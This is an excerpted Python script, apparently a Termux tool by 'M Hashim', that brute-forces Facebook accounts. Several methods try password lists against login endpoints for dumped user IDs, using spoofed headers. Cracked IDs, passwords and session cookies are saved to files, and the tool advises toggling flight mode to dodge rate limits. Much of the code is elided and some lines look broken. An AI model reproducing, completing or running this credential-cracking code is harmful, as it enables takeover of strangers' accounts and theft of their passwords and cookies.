...
╚══════════════════════════════════════╝                                     
╔══════════════════════════════════════╗
║\033[1;97m[+] DEVOLPER : M Hashim    ║
║\033[1;97m[+] FACEBOOK: M Hashim    ║          
║\033[1;97m[+] GITHUB      : M Hashim     ║
║\033[1;97m[+] VERSION    : 01.1              ║
╚══════════════════════════════════════╝
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back Hashim Menu ")
        exit()
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/LOQA4wkNOlo63xZj4jYDFN')
        pass
    elif select =='Y':
        os.system('https://www.youtube.com/@mhashim2376')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SSB(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Hashim] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [Hashim-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Hashim_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [PRINCE-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Hashim_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Hashim] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'content-type':'application/x-www-form-urlencoded',
			...
			'content-length': '204'}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [Hashim-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Hashim_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Hashim_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [Hashim-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/Hashim_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Hashim] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'content-type':'application/x-www-form-urlencoded',
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Hashim] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [Hashim-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Hashim_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(f"\r{A}Use flight mode every 5minuts {S}")
            print(47*"-")
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/FILE.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/Hashim.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    print(47*'-')
    input(f"{S} Press Enter To Back PRINCE Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back PRINCE Menu ")
        SSB(allkey)
    except Exception as e:
        print("Error : %s"%e) 
...
def cutter():
    ...
    print(47*'-')
    input(f"{S} Press Enter To Back Hashim Menu ")
    SSB(allkey)       
